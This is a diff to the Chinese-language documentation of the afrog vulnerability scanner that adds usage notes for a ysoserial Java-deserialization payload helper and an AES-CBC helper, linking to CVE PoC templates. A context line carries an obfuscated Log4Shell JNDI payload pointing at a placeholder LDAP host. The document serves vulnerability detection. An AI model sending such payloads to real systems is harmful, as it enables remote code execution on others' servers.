@@ -811,3 +811,39 @@ Host: 192.168.66.166
 X-Forwarded-For: ${jndi:ldap:${::-/}${::-/}x.x.x.x:1389/QW5qJX3cb16PKivauJxyWl}
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
 ```
+### Ysoserial
+用于生成 Java 反序列化 payload
+
+基本用法
+```
+ysoserial(payload, command, encode)
+```
+
+payload: 攻击载荷，[支持payload列表](https://github.com/zan8in/afrog/blob/main/v2/pkg/utils/ysoserial.go)
+
+command: 执行的命令，比如 xxx.dnslog.cn
+
+encode: 加密方法，目前支持：base64 和 hex
+
+参考示例
+
+[CVE-2023-49070](https://github.com/zan8in/afrog/blob/46404e7527ca8d5752a9679ce13c83f7fd7b9e5b/v2/pocs/afrog-pocs/CVE/2023/CVE-2023-49070.yaml#L2)、[CVE-2021-29200](https://github.com/zan8in/afrog/blob/46404e7527ca8d5752a9679ce13c83f7fd7b9e5b/v2/pocs/afrog-pocs/CVE/2021/CVE-2021-29200.yaml)
+
+### AesCBC
+用于 aes cbc 加密的 PoC
+
+基本用法
+```
+aesCBC(text,key,iv)
+```
+text: 被加密的字符串
+
+key: 加密 key
+
+iv: 加密 iv
+
+返回加密结果
+
+参考示例 
+
+[CVE-2023-20888](https://github.com/zan8in/afrog/blob/46404e7527ca8d5752a9679ce13c83f7fd7b9e5b/v2/pocs/afrog-pocs/CVE/2023/CVE-2023-20888.yaml)
